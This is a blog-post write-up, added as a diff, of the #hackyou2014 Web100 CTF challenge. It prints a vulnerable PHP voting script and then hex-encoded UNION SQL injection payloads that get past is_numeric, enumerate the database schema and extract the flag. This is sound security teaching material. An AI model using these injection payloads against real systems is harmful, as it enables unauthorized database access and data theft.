@@ -1,0 +1,358 @@
+
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>#hackyou2014 Web100 write-up</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="../../../../../assets/favicon.png?v=d47df0f104">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/screen.css?v=d47df0f104">
+    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+
+    <script type="text/javascript" src="../../../../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/moment.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/handlebars.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
+    <script type="text/javascript" src="../../../../../assets/js/index.js?v=d47df0f104"></script>
+
+
+    <link rel="canonical" href="http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/amp/">
+    
+    <meta property="og:site_name" content="&lt;/pwntester&gt;">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="#hackyou2014 Web100 write-up">
+    <meta property="og:description" content="In this level we are presented with some logos we can vote. If we look at the source code we can see an interesting comment: ... &amp;lt;!-- TODO: remove index.phps --&amp;gt;   ... We can grab the source code:  &amp;lt;?php include 'db.php';   session_start();   if (!isset($_SESSION['login']">
+    <meta property="og:url" content="http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/">
+    <meta property="article:published_time" content="2014-01-15T23:52:00.000Z">
+    <meta property="article:modified_time" content="2014-01-15T23:52:00.000Z">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="PHP">
+    <meta property="article:tag" content="HackYou2014">
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="#hackyou2014 Web100 write-up">
+    <meta name="twitter:description" content="In this level we are presented with some logos we can vote. If we look at the source code we can see an interesting comment: ... &amp;lt;!-- TODO: remove index.phps --&amp;gt;   ... We can grab the source code:  &amp;lt;?php include 'db.php';   session_start();   if (!isset($_SESSION['login']">
+    <meta name="twitter:url" content="http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="pwntester">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="CTF, PHP, HackYou2014">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "&lt;/pwntester&gt;",
+        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "pwntester",
+        "image": {
+            "@type": "ImageObject",
+            "url": "//www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404",
+            "width": 80,
+            "height": 80
+        },
+        "url": "http://www.pwntester.com/author/pwntester/",
+        "sameAs": []
+    },
+    "headline": "#hackyou2014 Web100 write-up",
+    "url": "http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/",
+    "datePublished": "2014-01-15T23:52:00.000Z",
+    "dateModified": "2014-01-15T23:52:00.000Z",
+    "keywords": "CTF, PHP, HackYou2014",
+    "description": "In this level we are presented with some logos we can vote. If we look at the source code we can see an interesting comment: ... &amp;lt;!-- TODO: remove index.phps --&amp;gt;   ... We can grab the source code:  &amp;lt;?php include &#x27;db.php&#x27;;   session_start();   if (!isset($_SESSION[&#x27;login&#x27;]",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://www.pwntester.com"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 0.11">
+    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">
+
+    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/prism.css?v=d47df0f104">
+
+    <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-49973078-2', 'pwntester.com');
+  ga('send', 'pageview');
+
+</script></head>
+
+<body class="post-template tag-ctf tag-php tag-hackyou201458">
+
+    <div id="sidebar">
+        <div id="sidebar-content" class="inner">
+            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../../../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
+            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
+            <h3 class="blog-description"></h3></h2>
+
+            <!--form id="search">
+                <input id="search-field" placeholder="Search"/>
+            </form-->
+            <form id="search">  
+                <input id="search-field" type="search" placeholder="Search">
+            </form>  
+
+            <div id="sidebar-links">
+                <ul id="subscription-links">
+                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
+                    <!-- No support yet
+                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
+                    -->
+                </ul>
+                <ul id="sidebar-internal">
+                    <!-- For 'About' and other pages -->
+                </ul>
+                <ul id="sidebar-external">
+                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
+<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
+<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
+<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
+                </ul>
+            </div>
+
+            <footer class="site-footer">
+                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
+            </footer>
+        </div>
+    </div>
+
+    <main>
+        <section id="results"></section>
+        
+
+<article class="post tag-ctf tag-php tag-hackyou201458">
+
+
+        <span class="post-meta"><time datetime="2014-01-16">16 Jan 2014</time> on <a href="../../../../../tag/ctf/">CTF</a> | <a href="../../../../../tag/php/">PHP</a> | <a href="../../../../../tag/hackyou201458/">HackYou2014</a></span>
+
+        <h1 class="post-title">#hackyou2014 Web100 write-up</h1>
+
+        <section class="post-content">
+            <p>In this <a href="http://hackyou2014tasks.ctf.su:10080/">level</a> we are presented with some logos we can vote.</p>
+
+<p><img src="../../../../../content/images/octopress/web100-1.png" alt=""></p>
+
+<p>If we look at the source code we can see an interesting comment:</p>
+
+<pre><code class="language-lang-html line-numbers ">...
+&lt;!-- TODO: remove index.phps --&gt;  
+...
+</code></pre>
+
+<p>We can grab the source code:</p>
+
+<pre><code class="language-lang-php line-numbers "> &lt;?php
+include 'db.php';  
+session_start();  
+if (!isset($_SESSION['login'])) {  
+    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
+}
+$login = $_SESSION['login'];
+
+if (isset($_POST['submit'])) {  
+    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
+        die('Hacking attempt!');
+    $id = $_POST['id'];
+    $vote = (int)$_POST['vote'];
+    if ($vote &gt; 5 || $vote &lt; 1)
+        $vote = 1;
+    $q = mysql_query("INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')");
+    $q = mysql_query("SELECT id FROM vote WHERE user = '{$login}' GROUP BY id");
+    echo '&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;';
+    echo '&lt;table border="1"&gt;';
+    echo '&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;';
+    while ($r = mysql_fetch_array($q)) {
+        $arr = mysql_fetch_array(mysql_query("SELECT title FROM picture WHERE id = ".$r['id']));
+        echo '&lt;tr&gt;&lt;td&gt;'.$arr[0].'&lt;/td&gt;';
+        $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM vote WHERE id = ".$r['id']));
+        echo '&lt;td&gt;'.$arr[0].'&lt;/td&gt;&lt;td&gt;'.round($arr[1],2).'&lt;/td&gt;&lt;/tr&gt;';
+    }
+    echo '&lt;/table&gt;';
+    echo '&lt;br&gt;&lt;a href="index.php"&gt;Back&lt;/a&gt;&lt;br&gt;';
+    exit;
+}
+&lt;html&gt;  
+&lt;head&gt;  
+    &lt;title&gt;Picture Gallery&lt;/title&gt;
+&lt;/head&gt;  
+&lt;body&gt;  
+&lt;p&gt;Welcome, &lt;?php echo $login; ?&gt;&lt;/p&gt;  
+&lt;p&gt;Help us to choose the best logo!&lt;/p&gt;  
+&lt;form action="index.php" method="POST"&gt;  
+&lt;table border="1" cellspacing="5"&gt;  
+&lt;tr&gt;  
+$q = mysql_query('SELECT * FROM picture');
+while ($r = mysql_fetch_array($q)) {  
+    echo '&lt;td&gt;&lt;img src="./images/'.$r['image'].'"&gt;&lt;div align="center"&gt;'.$r['title'].'&lt;br&gt;&lt;input type="radio" name="id" value="'.$r['id'].'"&gt;&lt;/div&gt;&lt;/td&gt;';
+}
+&lt;/tr&gt;  
+&lt;/table&gt;  
+&lt;p&gt;Your vote:  
+&lt;select name="vote"&gt;  
+&lt;option value="1"&gt;1&lt;/option&gt;  
+&lt;option value="2"&gt;2&lt;/option&gt;  
+&lt;option value="3"&gt;3&lt;/option&gt;  
+&lt;option value="4"&gt;4&lt;/option&gt;  
+&lt;option value="5"&gt;5&lt;/option&gt;  
+&lt;/select&gt;&lt;/p&gt;  
+&lt;input type="submit" name="submit" value="Submit"&gt;  
+&lt;/form&gt;  
+&lt;/body&gt;  
+&lt;/html&gt;  
+&lt;!-- TODO: remove index.phps --&gt;  
+</code></pre>
+
+<p>We cannot inject in <strong>vote</strong> because it is casted to an integer and the value is verified but we can inject in <strong>id</strong> if we can bypass the <strong>is_numeric</strong> function. Actually, it was quite easy, we can submit hexadecimal values and benefit from how <strong>mysql</strong> handles <a href="http://dev.mysql.com/doc/refman/5.0/en/hexadecimal-literals.html">hex literals</a>. <br>
+We can verify the injection submiting:</p>
+
+<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202873656c656374202748656c6c6f21212729  
+999999999999 union all (select 'Hello!!')  
+</code></pre>
+
+<p>The server will return:</p>
+
+<p><img src="../../../../../content/images/octopress/web100-2.png" alt=""></p>
+
+<p>Ok, now we can try something more interesting:</p>
+
+<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428736368656d615f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e736368656d61746129  
+999999999999 union all (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)  
+</code></pre>
+
+<pre><code class="language-lang-html line-numbers ">information_schema,mysql,performance_schema,task,test  
+</code></pre>
+
+<p>From "task"</p>
+
+<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e434154287461626c655f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d20277461736b2729  
+999999999999 union all (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'task')  
+</code></pre>
+
+<pre><code class="language-lang-html line-numbers ">Flag,picture,vote  
+</code></pre>
+
+<p>Now the columns:</p>
+
+<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428636f6c756d6e5f6e616d65292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f736368656d61203d20277461736b2720616e64207461626c655f6e616d653d27466c61672729  
+999999999999 union all (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'task' and table_name='Flag')  
+</code></pre>
+
+<pre><code class="language-lang-html line-numbers ">flag  
+</code></pre>
+
+<p>And finally:</p>
+
+<pre><code class="language-lang-html line-numbers ">0x39393939393939393939393920756e696f6e20616c6c202853454c4543542047524f55505f434f4e43415428666c6167292066726f6d20466c616729  
+999999999999 union all (SELECT GROUP_CONCAT(flag) from Flag)  
+</code></pre>
+
+<pre><code class="language-lang-html line-numbers ">CTF{820178c33c03aaa7cfe644c691679cf8}  
+</code></pre>
+        </section>
+
+        <footer class="post-footer">
+
+            <section class="author">
+                <div class="author-image">
+                     <img src="http://www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404" alt="pwntester"> 
+                </div>
+                <div class="author-text">
+                    <h4>pwntester</h4>
+                    <p></p>
+                    <div class="author-meta clearfix">
+                        
+                        
+                    </div>
+                </div>
+            </section>
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <div class="share-icons">
+                    <a class="fa fa-twitter-square" href="https://twitter.com/share?text=%23hackyou2014%20Web100%20write-up&amp;url=http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                        <span class="hidden">Twitter</span>
+                    </a>
+                    <a class="fa fa-facebook-square" href="https://www.facebook.com/sharer/sharer.php?u=http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                        <span class="hidden">Facebook</span>
+                    </a>
+                    <a class="fa fa-google-plus-square" href="https://plus.google.com/share?url=http://www.pwntester.com/blog/2014/01/16/hackyou2014-web100-write-up/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                        <span class="hidden">Google+</span>
+                    </a>
+                </div>
+            </section>
+
+        </footer>
+
+        <section class="post-comments">
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+                var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
+                /* * * DON'T EDIT BELOW THIS LINE * * */
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </section>
+
+
+</article>
+    </main>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+
+    <script src="../../../../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
+    <script data-no-instant>InstantClick.init();</script>
+    <script data-no-instant>
+        InstantClick.on('change', function() {
+            prism_markdown();
+            Prism.highlightAll();
+        });
+        InstantClick.init();
+    </script>
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+
+    <script type="text/javascript" src="../../../../../assets/js/prism-loader.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/prism.js?v=d47df0f104"></script>
+
+</body>
+
